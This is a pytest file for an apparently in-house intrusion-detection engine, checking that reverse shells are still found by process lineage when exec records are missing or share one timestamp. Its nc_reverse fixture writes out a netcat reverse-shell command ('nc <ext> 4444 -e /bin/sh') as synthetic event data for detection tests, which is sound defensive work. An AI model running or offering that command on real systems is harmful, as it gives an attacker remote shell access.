"""Lineage when the exec store has gaps, and execs of one instant: a reverse shell whose connecting ancestor's exec
was not recorded is still found (and says so); the exec store holds one floor per rule it serves; and a #! chain
(two execs of one pid at one instant) is ordered by audit serial, or is unknown without serials, never an arbitrary
pick."""
from datetime import timedelta

from romulus.detect import network
from romulus.detect.bounded import StateBudget, live_stores
from romulus.detect.correlation import InterpreterExternalConnection, PidTable
from romulus.detect.host import ExecLineage, ProcessLineage, share_lineage
from romulus.detect.lineage import ReverseShellByLineage
from romulus.detect.registry import fresh_pack
from tests.test_bounded_starvation import (
    EXT,
    T0,
    _by_rule,
    _cites_what_it_states,
    _every_hot_set_at_one,
    ev,
    flow,
    reverse_shell,
    run_sweep,
)


def nc_reverse(ts, pid=600):
    """`nc <ext> 4444 -e /bin/sh` by the web account: nc connects, and its child is the shell."""
    return [ev("process_exec", ts, host="app02", process__executable="/usr/bin/nc.openbsd", process__pid=pid,
               process__ppid=599, process__argv=["nc", EXT, "4444", "-e", "/bin/sh"], process__user="www-data"),
            ev("net_socket", ts + timedelta(seconds=1), host="app02", socket__syscall="connect", process__pid=pid,
               process__executable="/usr/bin/nc.openbsd", process__user="www-data", destination__ip=EXT,
               destination__port=4444),
            ev("process_exec", ts + timedelta(seconds=2), host="app02", process__executable="/bin/dash",
               process__pid=pid + 1, process__ppid=pid, process__argv=["/bin/sh"], process__user="www-data")]


def benign_exec(i, ts):
    return ev("process_exec", ts, host=f"h{i % 500}", process__pid=10000 + i, process__ppid=1,
              process__executable="/usr/bin/true", process__argv=["/usr/bin/true", str(i)], process__user="root",
              process__uid="0")


def _reverse(published):
    return _by_rule(published, ReverseShellByLineage.id)


def test_a_descendant_reverse_shell_is_found_when_the_exec_store_is_full(monkeypatch, tmp_path):
    budget = StateBudget(tmp_path, disk_total=2**40, reserve=0)
    budget.force_full("the exec store is past its floor and the headroom is spent (test)",
                      lambda account: account.name.endswith("exec_lineage"))
    pack = [ReverseShellByLineage(), InterpreterExternalConnection()]
    share_lineage(pack)
    published, cells = run_sweep(monkeypatch, tmp_path, pack, [nc_reverse(T0 + timedelta(minutes=1))], budget)
    [m] = _reverse(published)
    assert m.proposed_lane == "high" and EXT in m.claim
    assert "own exec was not recorded" in m.claim                     # the gap is stated in the claim itself
    assert any("exec was not recorded" in n for n in m.notes)
    window = next(c for c in cells if c["rule_id"] == ReverseShellByLineage.id and c["target"] == "*")
    assert window["state"] == "match_on_partial"
    _cites_what_it_states(published)


def test_a_routine_flood_and_benign_execs_never_hide_a_descendant_or_re_exec_reverse_shell(monkeypatch, tmp_path):
    _every_hot_set_at_one(monkeypatch)
    budget = StateBudget(tmp_path, disk_total=3_000_000, reserve=0)
    pack = [network.PortScan(), ReverseShellByLineage(), InterpreterExternalConnection()]
    share_lineage(pack)
    flood = [[flow(5000 * b + i, T0 + timedelta(minutes=b, seconds=i % 60)) for i in range(5000)] for b in range(6)]
    execs = [[benign_exec(4000 * b + i, T0 + timedelta(minutes=10 + b, seconds=i % 60)) for i in range(4000)]
             for b in range(4)]
    later = nc_reverse(T0 + timedelta(hours=2)) + reverse_shell(T0 + timedelta(hours=2, minutes=5))
    published, _cells = run_sweep(monkeypatch, tmp_path, pack, [*flood, *execs, later], budget)
    assert any(name.endswith("exec_lineage") for name in budget.full)     # the exec store is the one full
    hosts = sorted(m.events[0].host for m in _reverse(published))
    assert hosts == ["app01", "app02"] and all(m.proposed_lane == "high" for m in _reverse(published))
    _cites_what_it_states(published)


def test_the_exec_store_holds_one_floor_for_each_rule_it_serves(tmp_path):
    pack = fresh_pack()
    budget = StateBudget(tmp_path, disk_total=2**30, reserve=0)
    for pb in pack:
        pb.spill_dir, pb.budget = tmp_path, budget
    readers = [pb for pb in pack if any(isinstance(v, ExecLineage) for holder in
                                        (pb, getattr(pb, "lineage", None), getattr(pb, "pids", None))
                                        for v in getattr(holder, "__dict__", {}).values())]
    store = next(v for pb in readers for holder in (pb, getattr(pb, "lineage", None), getattr(pb, "pids", None))
                 for v in getattr(holder, "__dict__", {}).values() if isinstance(v, ExecLineage)).store
    assert store.weight == len(readers) >= 6
    budget.plan(live_stores(pack) + 1)
    account = store.account()
    assert account.weight == store.weight
    assert budget.floor_of(account) == store.weight * budget.floor
    assert budget.floor * (live_stores(pack) + 1) <= budget.disk_total // 2


# ---- a #! chain: two execs of one pid at one instant ---------------------------------------------------------------
def _chain(serials: bool):
    """`/srv/app/run` starts with `#!/usr/bin/env python3`: pid 300 execs env, then python3, at one instant; python3
    then runs `/bin/sh` as pid 301, one instant later and at the same instant."""
    def exec_(event_id, pid, ppid, exe, seconds, serial):
        fields = {"process__executable": exe, "process__pid": pid, "process__ppid": ppid,
                  "process__argv": [exe], "process__user": "www-data"}
        if serials:
            fields["audit__serial"] = serial
        e = ev("process_exec", T0 + timedelta(seconds=seconds), host="app03", **fields)
        return e.model_copy(update={"id": event_id})
    return [exec_("env", 300, 299, "/usr/bin/env", 0, 10), exec_("python", 300, 299, "/usr/bin/python3", 0, 11),
            exec_("sh-later", 301, 300, "/bin/sh", 1, 12), exec_("sh-same", 302, 300, "/bin/sh", 0, 13)]


def test_a_shebang_chain_is_ordered_by_audit_serial():
    lineage, table = ProcessLineage(), PidTable()
    for e in _chain(serials=True):
        lineage.observe(e)
        table.add(e)
    t0 = T0.timestamp()
    assert lineage.parent("app03", 300, t0 + 1).event_id == "python"              # the later image
    assert lineage.parent("app03", 300, t0, serial=13).event_id == "python"        # a child at that instant
    assert lineage.parent("app03", 300, t0, serial=11) .event_id == "env"          # before python's own exec
    assert table.lookup("app03", 300, t0 + 1)[1] == "/usr/bin/python3"
    assert table.exec_before("app03", 300, t0, serial=11, exclude="python")[1] == "/usr/bin/env"
    assert lineage.classify_pid("app03", 300, t0 + 1).ancestor.event_id == "python"


def test_without_serials_a_shebang_chains_image_at_that_instant_is_unknown_never_a_pick():
    lineage, table = ProcessLineage(), PidTable()
    for e in _chain(serials=False):
        lineage.observe(e)
        table.add(e)
    t0 = T0.timestamp()
    # env and python3 at one instant, unordered: the pid's image then, and after, is unknown
    assert lineage.parent("app03", 300, t0 + 1) is None
    assert lineage.parent("app03", 300, t0) is None
    assert table.lookup("app03", 300, t0 + 1) is None
    assert table.lineage_entries("app03", 300, t0 + 1) == []
    # one exec at an instant is not ambiguous: a process asked about at its own exec instant is that exec
    assert table.lookup("app03", 301, t0 + 1)[1] == "/bin/sh"
